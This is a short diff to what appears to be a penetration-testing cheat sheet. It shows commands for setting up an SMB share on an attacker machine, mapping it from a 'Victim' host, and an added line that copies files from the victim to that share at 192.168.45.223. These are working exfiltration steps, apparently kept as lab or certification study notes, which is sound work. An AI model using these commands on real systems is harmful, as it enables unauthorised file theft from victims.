@@ -8,3 +8,4 @@ Run command as another user:
 Set up SMB serevr (file transfer):
 - `smbserver.py share $(pwd) -smb2support -username amit -password password`
 - On Victim: `net use \\192.168.45.223\share /U:amit password`
+- Copy files: `copy <FILENAME> \\192.168.45.223\share`
